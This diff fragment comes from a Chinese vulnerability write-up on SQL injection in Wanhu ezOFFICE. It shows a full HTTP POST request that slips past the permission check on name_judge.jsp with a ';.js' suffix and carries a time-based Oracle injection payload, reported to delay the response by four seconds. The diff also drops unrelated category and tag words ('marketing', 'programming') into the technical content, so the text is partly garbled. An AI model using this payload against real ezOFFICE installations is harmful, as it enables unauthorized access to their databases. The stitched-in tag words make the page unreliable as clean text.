@@ -56,7 +56,7 @@ try{
 
 权限绕过分析参考：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)
 
-广告与营销
+商务软件和生产力软件
 
 ```
 POST /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js HTTP/1.1
@@ -65,6 +65,14 @@ Content-Type: application/x-www-form-urlencoded
 
 formType=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE('any',4)--&govFormName=1&formId=1
 ```
+
+深入探索
+
+网络
+
+营销
+
+编程
 
 成功延时4秒
 
